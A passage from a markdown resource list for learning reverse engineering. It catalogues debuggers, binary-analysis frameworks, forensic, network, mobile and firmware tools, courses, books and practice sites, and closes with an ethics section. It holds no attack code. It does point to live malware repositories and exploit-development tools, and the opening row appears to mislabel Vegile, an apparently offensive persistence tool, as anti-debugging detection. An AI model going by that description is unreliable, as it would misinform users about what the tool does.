| **Vegile** | Linux | Anti-debugging detection | [GitHub](https://github.com/Screetsec/Vegile) |

### Kernel Debuggers
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **WinDbg Preview** | Windows | Modern kernel/user debugger | [Microsoft Store](https://www.microsoft.com/en-us/p/windbg/9pgjgd53tn86) |
| **Volatility** | Cross-platform | Memory forensics framework | [GitHub](https://github.com/volatilityfoundation/volatility) |
| **rekall** | Cross-platform | Memory forensics framework | [GitHub](https://github.com/google/rekall) |

---

## 🏗️ Binary Analysis Frameworks

### Analysis Frameworks
| Tool | Language | Description | Link |
|------|----------|-------------|------|
| **angr** | Python | Binary analysis platform | [GitHub](https://github.com/angr/angr) |
| **BAP** | OCaml | Binary Analysis Platform | [GitHub](https://github.com/BinaryAnalysisPlatform/bap) |
| **Manticore** | Python | Symbolic execution tool | [GitHub](https://github.com/trailofbits/manticore) |
| **PANDA** | C++ | Platform for dynamic analysis | [GitHub](https://github.com/panda-re/panda) |
| **S2E** | C++ | Selective symbolic execution | [GitHub](https://github.com/S2E/s2e) |
| **Triton** | C++/Python | Dynamic binary analysis | [GitHub](https://github.com/JonathanSalwan/Triton) |

### Library-Based Tools
| Tool | Language | Description | Link |
|------|----------|-------------|------|
| **Capstone** | C/Python | Disassembly framework | [GitHub](https://github.com/capstone-engine/capstone) |
| **Keystone** | C/Python | Assembler framework | [GitHub](https://github.com/keystone-engine/keystone) |
| **Unicorn** | C/Python | CPU emulator framework | [GitHub](https://github.com/unicorn-engine/unicorn) |
| **pefile** | Python | PE file parser | [GitHub](https://github.com/erocarrera/pefile) |
| **LIEF** | C++/Python | Library to instrument executable formats | [GitHub](https://github.com/lief-project/LIEF) |
| **pyelftools** | Python | ELF file parser | [GitHub](https://github.com/eliben/pyelftools) |

---

## 🧠 Memory & Forensic Analysis

### Memory Acquisition
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **FTK Imager** | Windows | Memory acquisition | [AccessData](https://accessdata.com/product-download/ftk-imager-version-4-5) |
| **WinPmem** | Windows | Memory acquisition | [GitHub](https://github.com/Velocidex/WinPmem) |
| **LiME** | Linux | Linux Memory Extractor | [GitHub](https://github.com/504ensicsLabs/LiME) |
| **OSXPMem** | macOS | Memory acquisition | [GitHub](https://github.com/google/rekall/tree/master/tools/osx) |

### Memory Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Volatility** | Cross-platform | Memory forensics framework | [GitHub](https://github.com/volatilityfoundation/volatility) |
| **Rekall** | Cross-platform | Memory analysis framework | [GitHub](https://github.com/google/rekall) |
| **Redline** | Windows | Memory analysis | [FireEye](https://www.fireeye.com/services/freeware/redline.html) |
| **Memoryze** | Windows | Memory analysis | [FireEye](https://www.fireeye.com/services/freeware/memoryze.html) |

### Disk Forensics
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Autopsy** | Cross-platform | Digital forensics platform | [GitHub](https://github.com/sleuthkit/autopsy) |
| **Sleuth Kit** | Cross-platform | Forensic toolkit | [GitHub](https://github.com/sleuthkit/sleuthkit) |
| **FTK** | Windows | Commercial forensics suite | [AccessData](https://accessdata.com/products-services/forensic-toolkit-ftk) |
| **EnCase** | Windows | Commercial forensics | [Opentext](https://www.opentext.com/products/encase-forensic) |

---

## 🌐 Network Analysis

### Packet Capture
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Wireshark** | Cross-platform | Network protocol analyzer | [Website](https://www.wireshark.org/) |
| **tcpdump** | Linux/macOS | Command-line packet analyzer | Built-in |
| **Microsoft Message Analyzer** | Windows | Network analyzer | [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=44226) |
| **Zeek** | Linux | Network analysis framework | [GitHub](https://github.com/zeek/zeek) |

### Traffic Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **NetworkMiner** | Windows | Network forensic analysis | [Website](https://www.netresec.com/?page=NetworkMiner) |
| **CapLoader** | Windows | Advanced PCAP analysis | [Website](https://www.cap-loader.com/) |
| **Moloch** | Linux | Large scale PCAP indexing | [GitHub](https://github.com/aol/moloch) |
| **Suricata** | Cross-platform | Network IDS/IPS | [GitHub](https://github.com/OISF/suricata) |

### Protocol Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Scapy** | Python | Packet manipulation | [GitHub](https://github.com/secdev/scapy) |
| **Netzob** | Python | Protocol reverse engineering | [GitHub](https://github.com/netzob/netzob) |
| **CANalyzat0r** | Linux | CAN bus analysis | [GitHub](https://github.com/schutzwerk/CANalyzat0r) |

---

## 📱 Mobile RE Tools

### Android Tools
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **JADX** | Cross-platform | Dex to Java decompiler | [GitHub](https://github.com/skylot/jadx) |
| **APKTool** | Cross-platform | Reverse engineering APK files | [GitHub](https://github.com/iBotPeaches/Apktool) |
| **Frida** | Cross-platform | Dynamic instrumentation toolkit | [GitHub](https://github.com/frida/frida) |
| **Objection** | Python | Runtime mobile exploration | [GitHub](https://github.com/sensepost/objection) |
| **MobSF** | Cross-platform | Mobile security framework | [GitHub](https://github.com/MobSF/Mobile-Security-Framework-MobSF) |
| **Androguard** | Python | Android reverse engineering | [GitHub](https://github.com/androguard/androguard) |

### iOS Tools
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **class-dump** | macOS | Objective-C class info dumper | [GitHub](https://github.com/nygard/class-dump) |
| **Hopper** | macOS/Linux | Disassembler for macOS/iOS | [Website](https://www.hopperapp.com/) |
| **Cycript** | iOS/macOS | Injected JavaScript interpreter | [GitHub](https://github.com/cycript/cycript) |
| **iOS App Signer** | macOS | iOS app resigning | [GitHub](https://github.com/DanTheMan827/ios-app-signer) |
| **MachOView** | macOS | Mach-O file viewer | [GitHub](https://github.com/gdbinit/MachOView) |

### Mobile Emulators
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Android Studio** | Cross-platform | Official Android emulator | [Website](https://developer.android.com/studio) |
| **Genymotion** | Cross-platform | Android emulator | [Website](https://www.genymotion.com/) |
| **Corellium** | Web | Virtual iOS devices | [Website](https://www.corellium.com/) |

---

## 💾 Firmware & Hardware RE

### Firmware Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Binwalk** | Cross-platform | Firmware analysis tool | [GitHub](https://github.com/ReFirmLabs/binwalk) |
| **FACT** | Linux | Firmware analysis and comparison | [GitHub](https://github.com/fkie-cad/FACT_core) |
| **Firmadyne** | Linux | Firmware emulation | [GitHub](https://github.com/firmadyne/firmadyne) |
| **Firmware Analysis Toolkit** | Linux | Automated firmware analysis | [GitHub](https://github.com/attify/firmware-analysis-toolkit) |
| **AMD Flasher** | Linux | AMD BIOS flasher | [GitHub](https://github.com/skylarstein/amdflasher) |

### Hardware Tools
| Tool | Type | Description |
|------|------|-------------|
| **JTAGulator** | Hardware | JTAG discovery tool |
| **Bus Pirate** | Hardware | Multi-protocol tool |
| **Saleae Logic** | Hardware | Logic analyzer |
| **ChipWhisperer** | Hardware | Side-channel analysis |
| **Shikra** | Hardware | JTAG/SWD debugger |

### Chip Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Ghidra** | Cross-platform | Supports many architectures | [GitHub](https://github.com/NationalSecurityAgency/ghidra) |
| **Binary Ninja** | Cross-platform | Multiple architecture support | [Website](https://binary.ninja/) |
| **radare2** | Cross-platform | Wide architecture support | [GitHub](https://github.com/radareorg/radare2) |

---

## 🤖 Automation & Scripting

### Python Libraries
| Library | Description | Link |
|---------|-------------|------|
| **pwntools** | CTF framework and exploit dev | [GitHub](https://github.com/Gallopsled/pwntools) |
| **ropper** | ROP gadget finder | [GitHub](https://github.com/sashs/Ropper) |
| **z3** | Theorem prover | [GitHub](https://github.com/Z3Prover/z3) |
| **angr** | Binary analysis | [GitHub](https://github.com/angr/angr) |
| **frida** | Dynamic instrumentation | [GitHub](https://github.com/frida/frida) |
| **unicorn** | CPU emulator | [GitHub](https://github.com/unicorn-engine/unicorn) |
| **keystone** | Assembler framework | [GitHub](https://github.com/keystone-engine/keystone) |
| **capstone** | Disassembler framework | [GitHub](https://github.com/capstone-engine/capstone) |

### Scripting Environments
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **IDA Python** | IDA Pro | Python scripting in IDA | Built-in |
| **Binary Ninja API** | Binary Ninja | Python API | Built-in |
| **Ghidra Scripting** | Ghidra | Java/Python scripting | Built-in |
| **radare2 r2pipe** | radare2 | Pipe interface for scripting | [GitHub](https://github.com/radareorg/radare2-r2pipe) |

### Automation Frameworks
| Tool | Language | Description | Link |
|------|----------|-------------|------|
| **BARF** | Python | Binary Analysis and Reverse engineering Framework | [GitHub](https://github.com/programa-stic/barf-project) |
| **Binnavi** | Java | Binary analysis IDE | [GitHub](https://github.com/google/binnavi) |
| **Vivisect** | Python | Pure Python analysis/emulation | [GitHub](https://github.com/vivisect/vivisect) |

---

## 🌐 Online Resources

### Analysis Services
| Service | Description | Link |
|---------|-------------|------|
| **VirusTotal** | File scanning service | [Website](https://www.virustotal.com/) |
| **Hybrid Analysis** | Free malware analysis | [Website](https://www.hybrid-analysis.com/) |
| **Any.Run** | Interactive malware analysis | [Website](https://any.run/) |
| **Joe Sandbox** | Malware analysis | [Website](https://www.joesandbox.com/) |
| **Intezer Analyze** | Genetic malware analysis | [Website](https://analyze.intezer.com/) |

### Knowledge Bases
| Resource | Description | Link |
|----------|-------------|------|
| **MITRE ATT&CK** | Adversary tactics and techniques | [Website](https://attack.mitre.org/) |
| **Malpedia** | Malware encyclopedia | [Website](https://malpedia.caad.fkie.fraunhofer.de/) |
| **MalwareBazaar** | Malware sample exchange | [Website](https://bazaar.abuse.ch/) |
| **VirusShare** | Malware sample repository | [Website](https://virusshare.com/) |
| **TheZoo** | Live malware repository | [GitHub](https://github.com/ytisf/theZoo) |

### Documentation & References
| Resource | Description | Link |
|----------|-------------|------|
| **Intel Manuals** | x86/x64 architecture | [Intel](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html) |
| **AMD Manuals** | AMD64 architecture | [AMD](https://www.amd.com/en/support/tech-docs) |
| **ARM Documentation** | ARM architecture | [ARM](https://developer.arm.com/documentation) |
| **PE Format** | Microsoft PE specification | [Microsoft](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format) |
| **ELF Format** | ELF specification | [Tool Interface Standard](http://www.sco.com/developers/gabi/latest/contents.html) |

---

## 🎓 Learning Platforms

### Online Courses
| Platform | Course | Description |
|----------|--------|-------------|
| **OpenSecurityTraining** | Introductory x86 | Free x86 RE course |
| **SANS Institute** | FOR610 | Reverse Engineering Malware |
| **Pentester Academy** | x86_64 Assembly | Assembly language for hackers |
| **Udemy** | Various | Multiple RE courses |
| **Coursera** | Binary Exploitation | University courses |

### Video Tutorials
| Channel | Platform | Focus |
|---------|----------|-------|
| **LiveOverflow** | YouTube | Binary exploitation, RE |
| **GynvaelEN** | YouTube | Security, RE, CTF |
| **IppSec** | YouTube | HackTheBox walkthroughs |
| **John Hammond** | YouTube | CTF, malware analysis |
| **OALabs** | YouTube | Open Analysis Labs tutorials |

### Interactive Learning
| Platform | Description | Link |
|----------|-------------|------|
| **CTFtime** | CTF calendar | [Website](https://ctftime.org/) |
| **picoCTF** | Beginner-friendly CTF | [Website](https://picoctf.org/) |
| **OverTheWire** | War games | [Website](https://overthewire.org/wargames/) |
| **HackTheBox** | Penetration testing labs | [Website](https://www.hackthebox.com/) |
| **TryHackMe** | Learning paths | [Website](https://tryhackme.com/) |

---

## 📚 Books & Publications

### Foundational Books
| Book | Author | Year | Focus |
|------|--------|------|-------|
| **Practical Malware Analysis** | Michael Sikorski, Andrew Honig | 2012 | Malware analysis |
| **The IDA Pro Book** | Chris Eagle | 2011 | IDA Pro usage |
| **Reversing: Secrets of Reverse Engineering** | Eldad Eilam | 2005 | General RE |
| **The Ghidra Book** | Chris Eagle, Kara Nance | 2020 | Ghidra usage |
| **The Art of Memory Forensics** | Michael Hale Ligh, et al. | 2014 | Memory analysis |

### Technical References
| Book | Author | Year | Focus |
|------|--------|------|-------|
| **Intel 64 and IA-32 Architectures Software Developer Manuals** | Intel | Ongoing | x86/x64 |
| **System V Application Binary Interface** | Various | Ongoing | ABI specifications |
| **PE Format Specification** | Microsoft | Ongoing | Windows PE format |
| **ARM Architecture Reference Manual** | ARM Ltd. | Ongoing | ARM architecture |

### Advanced Topics
| Book | Author | Year | Focus |
|------|--------|------|-------|
| **The Shellcoder's Handbook** | Chris Anley, et al. | 2007 | Exploit development |
| **Rootkits: Subverting the Windows Kernel** | Greg Hoglund, James Butler | 2005 | Rootkit development |
| **Android Hacker's Handbook** | Joshua Drake, et al. | 2014 | Android security |
| **iOS Hacker's Handbook** | Charlie Miller, et al. | 2012 | iOS security |
| **The Practice of Network Security Monitoring** | Richard Bejtlich | 2013 | Network monitoring |

---

## 👥 Communities & Forums

### Online Communities
| Community | Platform | Focus |
|-----------|----------|-------|
| **Reverse Engineering Subreddit** | Reddit | General RE |
| **Malware Analysis Subreddit** | Reddit | Malware focus |
| **Ghidra Discord** | Discord | Ghidra users |
| **Radare2 Discord** | Discord | Radare2 users |
| **Binary Ninja Slack** | Slack | Binary Ninja users |

### Forums & Discussion Boards
| Forum | Description | Link |
|-------|-------------|------|
| **Reverse Engineering Stack Exchange** | Q&A site | [Website](https://reverseengineering.stackexchange.com/) |
| **OpenRCE Forums** | RE discussion | [Website](http://www.openrce.org/forums/) |
| **Woodmann's RE Forum** | Long-standing RE forum | [Website](https://forum.woodmann.com/) |
| **Tuts4You** | RE tutorials and forums | [Website](https://tuts4you.com/) |
| **Crackmes.one Forum** | Crackme discussions | [Website](https://crackmes.one/forum/) |

### Conference Materials
| Conference | Materials | Link |
|------------|-----------|------|
| **REcon** | Presentations | [Website](https://recon.cx/) |
| **Black Hat** | Presentations | [Website](https://www.blackhat.com/) |
| **DEF CON** | Presentations | [Website](https://defcon.org/) |
| **Chaos Communication Congress** | Recordings | [Website](https://media.ccc.de/) |

---

## 🎯 Practice Platforms

### Crackme Collections
| Platform | Description | Link |
|----------|-------------|------|
| **Crackmes.one** | Largest crackme collection | [Website](https://crackmes.one/) |
| **Reversing.kr** | Korean crackme site | [Website](http://reversing.kr/) |
| **PELock CrackMe** | Windows crackmes | [Website](https://www.pelock.com/products/crackme) |
| **Crackmes.de Archive** | Archived crackmes | [Website](https://crackmes.de/) |

### Malware Analysis Practice
| Resource | Description | Link |
|----------|-------------|------|
| **Malware Traffic Analysis** | Network traffic exercises | [Website](https://www.malware-traffic-analysis.net/) |
| **Malware Analysis Exercises** | Practical exercises | [GitHub](https://github.com/rshipp/awesome-malware-analysis#exercises) |
| **FlareVM** | Windows RE VM | [GitHub](https://github.com/fireeye/flare-vm) |
| **REMnux** | Linux RE distro | [Website](https://remnux.org/) |

### CTF Platforms
| Platform | Description | Link |
|----------|-------------|------|
| **picoCTF** | Beginner CTF | [Website](https://picoctf.org/) |
| **HackTheBox** | Challenge-based | [Website](https://www.hackthebox.com/) |
| **TryHackMe** | Learning-focused | [Website](https://tryhackme.com/) |
| **CTFlearn** | Community CTF | [Website](https://ctflearn.com/) |
| **WeChall** | Challenge aggregator | [Website](https://www.wechall.net/) |

---

## 🚀 Getting Started Guide

### Step 1: Setup Your Environment
1. **Install a Linux VM** (Ubuntu/Debian recommended)
2. **Setup basic tools**: 
   ```bash
   sudo apt install gdb radare2 binwalk strace ltrace
   ```
3. **Install Python libraries**:
   ```bash
   pip install pwntools capstone keystone unicorn
   ```

### Step 2: Learn the Basics
1. **Start with simple crackmes** from crackmes.one
2. **Follow tutorials** from LiveOverflow YouTube
3. **Practice assembly** with microcorruption.com

### Step 3: Choose Your Tools
- **Beginner**: Ghidra + GDB
- **Intermediate**: radare2 + Binary Ninja
- **Advanced**: IDA Pro + custom scripts

### Step 4: Specialize
1. **Malware Analysis**: REMnux + FlareVM
2. **Mobile RE**: Android Studio + JADX
3. **Firmware RE**: Binwalk + QEMU
4. **Game RE**: Cheat Engine + x64dbg

---

## 📈 Skill Development Path

### Month 1-3: Foundation
- Learn x86/x64 assembly
- Master GDB basics
- Solve easy crackmes
- Understand PE/ELF formats

### Month 4-6: Intermediate
- Learn Python for RE
- Master radare2/Ghidra
- Solve medium crackmes
- Study common algorithms

### Month 7-12: Advanced
- Learn anti-debug techniques
- Study malware analysis
- Participate in CTFs
- Contribute to open-source tools

### Year 2+: Specialization
- Choose a focus area
- Develop expertise
- Contribute research
- Mentor others

---

## ⚠️ Legal & Ethical Considerations

### Always:
- Only analyze software you own or have permission to analyze
- Respect licenses and copyrights
- Use isolated environments (VMs)
- Follow responsible disclosure

### Never:
- Reverse engineer for piracy
- Analyze systems without authorization
- Use skills for illegal activities
- Share sensitive information

### Resources for Ethics:
- **IEEE Code of Ethics**
- **ACM Code of Ethics**
- **EC-Council Code of Ethics**
- **Local laws and regulations**

---

## 🎉 Final Thoughts

Reverse engineering is a journey, not a destination. The field is constantly evolving, and there's always more to learn. 

### Key Principles:
1. **Be curious** - The best reversers are naturally curious
2. **Be persistent** - Complex problems take time
3. **Be ethical** - Use your skills responsibly
4. **Be collaborative** - Share knowledge with the community
5. **Be adaptable** - Tools and techniques change

### Remember:
- Start simple and build up
- Document everything
- Practice regularly
- Join communities
- Have fun!

Happy reversing! 🚀🔍

*Last Updated: 2026*
